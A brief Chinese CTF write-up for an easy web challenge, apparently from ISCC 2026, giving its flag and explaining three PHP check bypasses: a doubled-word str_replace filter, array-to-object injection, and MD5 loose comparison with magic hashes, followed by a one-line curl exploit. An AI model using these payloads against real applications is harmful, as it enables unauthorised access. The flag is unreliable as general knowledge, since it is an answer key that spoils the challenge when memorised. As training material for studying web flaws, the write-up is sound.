# 消失的密钥

> **Category**: Web | **Difficulty**: Easy | **Competition**: ISCC 2026 School
> **Flag**: `ISCC{QN-tGwW0yZD4!1fQ?TXJ0b0)bUag8i}`

---

## Attack Chain

```
?source=1 看源码 → 三层PHP绕过: 双写 + 数组转对象 + MD5弱比较
```

## Key Techniques

### 三关绕过

**Level 1 — 双写绕过**

```php
$filtered = str_replace("key", "", $step1);
if ($filtered === "key")  // kkeyey → 删掉key → key ✅
```

**Level 2 — 数组转对象注入**

```php
$obj_a = (object)$a;       // (object)["key"=>"1337"]
$user_key = $obj_a->key;   // → "1337" ✅
// POST: a[key]=1337
```

**Level 3 — MD5弱比较**

```php
if (md5($val_a) == md5($val_b))  // 松散比较 ==
```

| 值 | MD5 | 结果 |
|---|---|---|
| `QNKCDZO` | `0e830400...` | 0 (科学计数法) |
| `240610708` | `0e462097...` | 0 (科学计数法) |

`0 == 0` → `true` ✅

备选方案: 数组绕过 `?a[]=1&b[]=2` → `md5(array) = NULL, NULL == NULL`

## One-liner Exploit

```bash
curl -X POST "TARGET/?step1=kkeyey&a=QNKCDZO&b=240610708" -d "a[key]=1337"
```

## Distilled Knowledge

| 知识点 | 关键 |
|--------|------|
| PHP双写绕过 | `str_replace("X","",$s)` → `XX` |
| 数组转对象 | `(object)["key"=>"val"]` 创建stdClass |
| MD5弱比较 | `0e\d+` 在`==`下=0, 经典值: QNKCDZO, 240610708 |
| 数组绕过 | `md5(array) = NULL`, `NULL == NULL` |

---

*Original writeup: `C:\Users\48714\Desktop\wp\校赛\消失的密钥_wp.md`*
